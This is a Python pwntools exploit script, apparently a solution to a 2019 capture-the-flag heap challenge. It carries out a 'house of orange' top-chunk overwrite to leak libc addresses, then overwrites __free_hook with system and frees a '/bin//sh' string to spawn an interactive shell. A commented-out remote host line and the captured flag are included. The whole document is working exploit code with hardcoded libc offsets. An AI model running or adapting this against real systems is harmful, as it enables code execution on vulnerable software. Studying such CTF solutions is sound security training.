# -*- coding: utf-8 -*-
from pwn import *
import os


PROMPT = "Command me: "

def malloc(io, size):
	io.recvuntil(PROMPT)
	io.sendline("1")
	io.recvuntil("How much greet? : ")
	io.sendline(str(size))

def leak(io, size):
	io.recvuntil(PROMPT)
	io.sendline("2")
	io.recvuntil("How much writ? : ")
	io.sendline(str(size))
	return io.recv(size)

def memcpy(io):
	io.recvuntil(PROMPT)
	io.sendline("3")
	io.recvuntil("Dennis yeet")

def gets(io, content):
	#stops at \n
	assert "\n" not in content 
	io.recvuntil(PROMPT)
	io.sendline("4")
	io.recvuntil("Pizza: ")
	io.sendline(content)

def free(io):
	io.recvuntil(PROMPT)
	io.sendline("5")
	io.recvuntil("Dennis delet")
	


#house of orange exploit
#simplified since we have memcpy

def exploit():
	env = os.environ.copy()
	env["LD_PRELOAD"] = "./libc-2.23.so"
	io = process("./patch", env=env)
#	io = remote("chall.2019.redpwn.net", 4006)


	#first stage
	#leak libc pointers

	malloc(io, 0x400-8)

	payload = p32(0x0)*255
	payload += p32(0xc01)  #top chunk size
	gets(io, payload)

	malloc(io, 0x1000)
	pause()
	malloc(io, 0x20)
	malloc_hook =	u32(leak(io, 4)) - 0x340
	libc = malloc_hook - 0x01b0768
	system = libc + 0x003a940
	free_hook = libc + 0x001b18b0
	assert libc & 0xfff == 0

	log.success("malloc hook {}".format(hex(malloc_hook)))
	log.success("free hook {}".format(hex(free_hook)))
	log.success("libc {}".format(hex(libc)))
	log.success("system hook {}".format(hex(system)))

	payload  = p32(system)
	payload += p32(free_hook)
	gets(io, payload)

	memcpy(io)
	gets(io, "/bin//sh\x00")
	free(io)

	io.interactive()
	io.close()

#flag{1f_y0u'r3_r3ad1ng_th1s,_t3ll_0rg4niz3r_TPA_t0_d0_h1s_h0mew0rk}

exploit()
	
